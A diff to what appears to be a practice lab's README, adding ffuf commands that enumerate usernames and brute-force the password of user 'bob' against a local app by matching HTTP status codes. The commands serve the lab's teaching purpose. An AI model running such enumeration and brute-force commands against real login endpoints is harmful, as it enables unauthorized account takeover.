@@ -79,6 +79,21 @@ go install github.com/ffuf/ffuf/v2@latest      # with Go
 # on Kali: apt install ffuf
 ```
 
+**The endpoints answer with meaningful HTTP status codes** (no redirects), so you
+can fuzz by matching the code with ffuf's `-mc` (match) or `-fc` (filter):
+
+```bash
+# enumerate usernames: a taken name answers 409, a free one 201
+ffuf -w usernames.txt -u http://localhost:3000/register \
+     -X POST -d "username=FUZZ&password=x" \
+     -H "Content-Type: application/x-www-form-urlencoded" -mc 409
+
+# brute-force a password: the right one answers 200, the rest 401
+ffuf -w passwords.txt -u http://localhost:3000/login \
+     -X POST -d "username=bob&password=FUZZ" \
+     -H "Content-Type: application/x-www-form-urlencoded" -mc 200
+```
+
 ---
 
 ## 3) Objectives
